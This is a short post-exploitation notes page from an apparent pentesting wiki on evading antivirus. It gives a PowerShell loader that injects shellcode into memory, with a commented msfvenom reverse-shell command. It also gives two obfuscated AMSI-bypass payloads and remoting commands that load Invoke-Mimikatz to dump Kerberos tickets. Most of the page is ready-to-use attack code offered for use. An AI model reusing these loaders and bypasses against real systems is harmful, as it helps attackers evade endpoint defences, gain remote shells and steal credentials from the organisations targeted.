---
title: AV Evasion
category: Post Exploitation
order: 1
---

A basic template script that performs in-memory injection:

```powershell
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;
[Byte[]];
# msfvenom -p windows/shell_reverse_tcp LHOST=<ip_addr> LPORT=<port> -f powershell
[Byte[]]$sc = <place your shellcode here>;
$size = 0x1000;
if ($sc.Length -gt 0x1000) {$size = $sc.Length};
$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);
for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};
$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```

Another way to bypass AV is using Shellter

![](/hackingnotes/images/shellter.png)


# String Replacement

FUTURE CONTENT

https://s3cur3th1ssh1t.github.io/Building-a-custom-Mimikatz-binary/
https://s3cur3th1ssh1t.github.io/Customizing_C2_Frameworks/


# AMSI bypass

AMSI bypass method to execute powershell scripts such as `Invoke-Mimikatz.ps1` with `PowerShell Remote`.

First we need to create a session on the target machine.

```powershell
$sess = New-PSSession -ComputerName srv01.corp.local
Enter-PSSession -Session $sess
```
Execute the following payload and exit the session.

```powershell
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```
Other payload:

```powershell
[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
```

Import the script remotely with `PowerShell Remote`:

```powershell
Invoke-Command -FilePath .\Invoke-Mimikatz.ps1 -Session $sess
```
Enter in the session again and execute the malicious script.

```powershell
Enter-PSSession -Session $sess
Invoke-Mimikatz -Command '"sekurlsa::tickets'
```

> **Note**: More bypasses are available on the following resource:
>
> https://gist.github.com/reigningshells/a255fcca07465befbcbf4be9cdf67560



https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/